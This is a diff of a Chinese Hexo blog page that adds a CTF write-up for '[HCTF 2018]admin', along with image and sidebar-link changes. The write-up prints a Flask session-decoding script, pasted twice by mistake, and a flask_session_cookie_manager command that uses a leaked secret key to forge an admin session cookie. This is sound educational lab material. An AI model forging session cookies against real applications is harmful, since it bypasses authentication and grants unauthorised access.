@@ -100,12 +100,12 @@ youlin = Hexo</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicit31ffoj20zk0m8naf.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicljitigmj20zk0m87fp.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclwuom7cj20zk0m8dvn.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giph4fomxoj20zk0m8axp.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicli9lfebj20zk0m84qp.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicitspjpbj20zk0m81ky.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipeubcbajj20zk0m8h1h.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipet8c1a2j20zk0m8kct.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicitht3xtj20zk0m8k5v.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipesrnqv3j20zk0m8ava.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclil3m4ej20zk0m8tn8.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicis081o9j20zk0m8dmr.jpg"></li>
         </ul>
       </div>
     </header>
@@ -172,6 +172,27 @@ youlin = Hexo</title>
 <p>flag:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d7947c55-1a3c-473e-ad6a-00e7ec06cdc6&#125; </span><br></pre></td></tr></table></figure>
 
+<h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>首先进入网站，有登录和注册，注册了一个账号后在change界面找到hint，可以找到网站的源码</p>
+<p><img data-src="https://tuchuangs.com/imgs/2022/11/19/cbe25ec4166ed039.png"></p>
+<p>在源码中发现只要账号的session是admin后就会打印出flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% include(&#x27;header.html&#x27;) %&#125;</span><br><span class="line">&#123;% if current_user.is_authenticated %&#125;</span><br><span class="line">&lt;h1 class=&quot;nav&quot;&gt;Hello &#123;&#123; session[&#x27;name&#x27;] &#125;&#125;&lt;/h1&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% if current_user.is_authenticated and session[&#x27;name&#x27;] == &#x27;admin&#x27; %&#125;</span><br><span class="line">&lt;h1 class=&quot;nav&quot;&gt;hctf&#123;xxxxxxxxx&#125;&lt;/h1&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&lt;!-- you are not admin --&gt;</span><br><span class="line">&lt;h1 class=&quot;nav&quot;&gt;Welcome to hctf&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&#123;% include(&#x27;footer.html&#x27;) %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先用解密脚本跑一下自己注册的账号的session</p>
+<p>解密脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import zlib</span><br><span class="line">from base64 import b64decode</span><br><span class="line">from flask.sessions import session_json_serializer</span><br><span class="line">from itsdangerous import base64_decode</span><br><span class="line"></span><br><span class="line">def decryption(payload):</span><br><span class="line">    payload, sig = payload.rsplit(b&#x27;.&#x27;, 1)</span><br><span class="line">    payload, timestamp = payload.rsplit(b&#x27;.&#x27;, 1)</span><br><span class="line"></span><br><span class="line">    decompress = False</span><br><span class="line">    if payload.startswith(b&#x27;.&#x27;):</span><br><span class="line">        payload = payload[1:]</span><br><span class="line">        decompress = True</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        raise Exception(&#x27;Could not base64 decode the payload because of &#x27;</span><br><span class="line">                         &#x27;an exception&#x27;)</span><br><span class="line"></span><br><span class="line">    if decompress:</span><br><span class="line">        try:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            raise Exception(&#x27;Could not zlib decompress the payload before &#x27;</span><br><span class="line">                             &#x27;decoding the payload&#x27;)</span><br><span class="line"></span><br><span class="line">    return session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    print(decryption(sys.argv[1].encode()))youlin@youlin-virtual-machine:~/web$ cat session.py </span><br><span class="line">import sys</span><br><span class="line">import zlib</span><br><span class="line">from base64 import b64decode</span><br><span class="line">from flask.sessions import session_json_serializer</span><br><span class="line">from itsdangerous import base64_decode</span><br><span class="line"></span><br><span class="line">def decryption(payload):</span><br><span class="line">    payload, sig = payload.rsplit(b&#x27;.&#x27;, 1)</span><br><span class="line">    payload, timestamp = payload.rsplit(b&#x27;.&#x27;, 1)</span><br><span class="line"></span><br><span class="line">    decompress = False</span><br><span class="line">    if payload.startswith(b&#x27;.&#x27;):</span><br><span class="line">        payload = payload[1:]</span><br><span class="line">        decompress = True</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        raise Exception(&#x27;Could not base64 decode the payload because of &#x27;</span><br><span class="line">                         &#x27;an exception&#x27;)</span><br><span class="line"></span><br><span class="line">    if decompress:</span><br><span class="line">        try:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            raise Exception(&#x27;Could not zlib decompress the payload before &#x27;</span><br><span class="line">                             &#x27;decoding the payload&#x27;)</span><br><span class="line"></span><br><span class="line">    return session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    print(decryption(sys.argv[1].encode()))</span><br></pre></td></tr></table></figure>
+
+<img src = 'https://tuchuangs.com/imgs/2022/11/19/48b124f7f04c1bc0.png' />
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">youlin@youlin-virtual-machine:~/web$ python session.py .eJw9UEuLwjAQ_ivLnD3UPi6CB6GutDAjW1JDchFta5vEKlSlNOJ_31kXPAwMfPO95gn709DcOljch0czg72pYfGEryMsAK2blG1j9DxpO0dfTVuBAW5yp3zlUaiY-tyiX0WUulj52pDI_FZ0vbJlTF5FZFuPPYbblKyW-qzketRWd1pUI4ky1iILSWCEYdGpcMf82ihfOJQle-4ceQxRFB3KnVXCMTebK_mTkC0MZ0pQFnxfLeE1g-o2nPb3q2sunwoUZhNHi7T8NrwHxGExdQFarpHWlja5UfbPbp2g11yL7VbLt5zpD23zUarTfCzHf-Ry6BmA6fo4mwvM4HFrhvfjYB7A6xeCPG4Q.Y3iTyA.jV0tqYnpLbmzD9wE9Yh_AhC-BxI</span><br><span class="line">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;292b883880853729340bdc731686bc307498c7b52398fb587676832c683cefeaa0f6ae70558e265373daceb57bc4d1e805d73614a1eca90f25ad964b0891dbc7&#x27;, &#x27;csrf_token&#x27;: b&#x27;7b2497eab7b463309423407c4bbb4d1a936dc360&#x27;, &#x27;image&#x27;: b&#x27;t2pS&#x27;, &#x27;name&#x27;: &#x27;youlin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以看到只需要将自己注册的name的youlin改为admin之后就可以了</p>
+<p>git clone 大佬给出的 flask session 加密py地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25vcmFqL2ZsYXNrLXNlc3Npb24tY29va2llLW1hbmFnZXI=">flask_session_cookie_manager</span></p>
+<p>在加密代码中 需要一个 secret_key 的值，这个值在 题目源码中 也可以找到，然后构造好自己的 session 再进行加密。</p>
+<p><img data-src="https://img-blog.csdnimg.cn/img_convert/a90be6e676cd1d23accfe21ef9868cac.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode -s &quot;ckj123&quot; -t &quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;292b883880853729340bdc731686bc307498c7b52398fb587676832c683cefeaa0f6ae70558e265373daceb57bc4d1e805d73614a1eca90f25ad964b0891dbc7&#x27;, &#x27;csrf_token&#x27;: b&#x27;7b2497eab7b463309423407c4bbb4d1a936dc360&#x27;, &#x27;image&#x27;: b&#x27;t2pS&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>就可以得到对应的session的内容，然后利用bp进行抓包修改session发送后就可以得到flag</p>
+<p><img data-src="C:\Users\youlin\AppData\Roaming\Typora\typora-user-images\1668847091154.png" alt="1668847091154"></p>
 
   </div>
 
@@ -183,7 +204,7 @@ youlin = Hexo</title>
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">Edited on</span>
-    <time title="Modified: 2022-11-19 01:30:59" itemprop="dateModified" datetime="2022-11-19T01:30:59+08:00">2022-11-19</time>
+    <time title="Modified: 2022-11-19 16:38:27" itemprop="dateModified" datetime="2022-11-19T16:38:27+08:00">2022-11-19</time>
   </span>
 </div>
 
@@ -238,7 +259,7 @@ youlin = Hexo</title>
     <div class="item left">
       
 
-  <a href="/2022/11/06/%E7%A5%A5%E4%BA%91%E6%9D%AF%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giciuv0socj20zk0m8qes.jpg" title="祥云杯复现">
+  <a href="/2022/11/06/%E7%A5%A5%E4%BA%91%E6%9D%AF%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giciszlczyj20zk0m816d.jpg" title="祥云杯复现">
   <span class="type">Previous Post</span>
   <span class="category"><i class="ic i-flag"></i> </span>
   <h3>祥云杯复现</h3>
@@ -262,7 +283,7 @@ youlin = Hexo</title>
   <div class="panels">
     <div class="inner">
       <div class="contents panel pjax" data-title="Contents">
-          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF2020-Easy-MD5"><span class="toc-number">1.</span> <span class="toc-text">[BJDCTF2020]Easy MD5</span></a></li></ol>
+          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF2020-Easy-MD5"><span class="toc-number">1.</span> <span class="toc-text">[BJDCTF2020]Easy MD5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HCTF-2018-admin"><span class="toc-number">2.</span> <span class="toc-text">[HCTF 2018]admin</span></a></li></ol>
       </div>
       <div class="related panel pjax" data-title="Related">
       </div>
@@ -335,7 +356,17 @@ youlin = Hexo</title>
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/08/04/0ctf-2017-babyheap/" title="0ctf_2017_babyheap">0ctf_2017_babyheap</a></span>
+    <span><a href="/2022/08/01/io-file/" title="io_file">io_file</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/cometition/" title="In cometition">cometition</a>
+</div>
+
+    <span><a href="/2022/09/20/DASCTF-X-CBCTF-2022%E4%B9%9D%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/" title="DASCTF_X_CBCTF_2022九月挑战赛">DASCTF_X_CBCTF_2022九月挑战赛</a></span>
   </li>
 
       
@@ -353,24 +384,6 @@ youlin = Hexo</title>
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/08/28/debug%E4%BF%A1%E6%81%AF%E4%BF%AE%E6%94%B9/" title="debug信息修改">debug信息修改</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/10/16/docker/" title="docker">docker</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
     <span><a href="/2022/04/18/%E6%A0%88%E8%BF%81%E7%A7%BB/" title="栈迁移">栈迁移</a></span>
   </li>
 
@@ -380,7 +393,7 @@ youlin = Hexo</title>
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/11/19/buu-web/" title="buu_web（21-xx)">buu_web（21-xx)</a></span>
+    <span><a href="/2022/09/07/io-file%E5%88%A9%E7%94%A8/" title="io_file利用">io_file利用</a></span>
   </li>
 
       
@@ -390,16 +403,7 @@ youlin = Hexo</title>
 <a href="/categories/cometition/" title="In cometition">cometition</a>
 </div>
 
-    <span><a href="/2022/03/18/picoCTF-wp/" title="picoCTF_wp">picoCTF_wp</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/04/10/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/" title="整数溢出">整数溢出</a></span>
+    <span><a href="/2022/09/22/%E6%9F%8F%E9%B9%AD%E6%9D%AF/" title="柏鹭杯">柏鹭杯</a></span>
   </li>
 
       
@@ -417,7 +421,25 @@ youlin = Hexo</title>
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/11/06/%E7%A5%A5%E4%BA%91%E6%9D%AF%E5%A4%8D%E7%8E%B0/" title="祥云杯复现">祥云杯复现</a></span>
+    <span><a href="/2022/09/21/aarch64/" title="aarch64">aarch64</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/08/06/%E5%88%A9%E7%94%A8-IO-2-1-stdout%E6%B3%84%E9%9C%B2libc/" title="利用_IO_2_1_stdout泄露libc">利用_IO_2_1_stdout泄露libc</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/08/22/house-of-banana/" title="house_of_banana">house_of_banana</a></span>
   </li>
 
   </ul>
